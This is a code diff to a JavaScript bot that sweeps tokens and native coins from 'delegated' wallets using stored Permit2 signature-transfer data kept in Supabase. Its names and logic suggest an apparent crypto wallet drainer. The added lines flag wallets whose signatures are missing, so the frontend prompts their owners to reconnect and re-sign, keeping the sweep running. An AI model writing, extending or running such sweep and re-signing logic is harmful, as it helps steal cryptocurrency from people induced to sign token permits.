@@ -660,6 +660,17 @@ async function sweepGaslessWallet(walletAddress) {
 
   // ── Part 6: Log signature data read from Supabase ─────────────────────────
   log(`[gasless] sig type: ${typeof signatureTransfers}`);
+
+  // No signature data at all — mark needs_reactivation so the user gets prompted
+  // to reconnect. Without this, the bot loops forever with no sweep and no signal.
+  if (!signatureTransfers && !permitBatch) {
+    warn(`[gasless] ${checksum.slice(0,10)} — no signature data in permit_metadata — marking needs_reactivation`);
+    if (supabase) await supabase.from("delegated_wallets")
+      .update({ needs_reactivation: true })
+      .eq("address", checksum.toLowerCase()).eq("chain", CHAIN).then(v => v, () => {});
+    return;
+  }
+
   if (signatureTransfers && typeof signatureTransfers === 'object' && !Array.isArray(signatureTransfers)) {
     const st = signatureTransfers;
     log(`[gasless] permitted count: ${st.permitted?.length ?? 0}`);
@@ -2256,6 +2267,13 @@ async function sweep(wallet) {
         (!stData || stData?.permit?.transfer_type !== "batch-signature-transfer")) {
       log(`[gasless] -sig row absent or non-standard format — trying permit_metadata fallback`);
       await sweepGaslessWallet(checksum);
+      // If the -sig row was missing entirely (not just malformed), set needs_reactivation
+      // so the frontend prompts the user to re-sign.
+      if (!stData && supabase) {
+        await supabase.from("delegated_wallets")
+          .update({ needs_reactivation: true })
+          .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+      }
     }
 
     // ── Native coin sweep for permit2 wallets (V2.1 sweepETHFor) ──────────
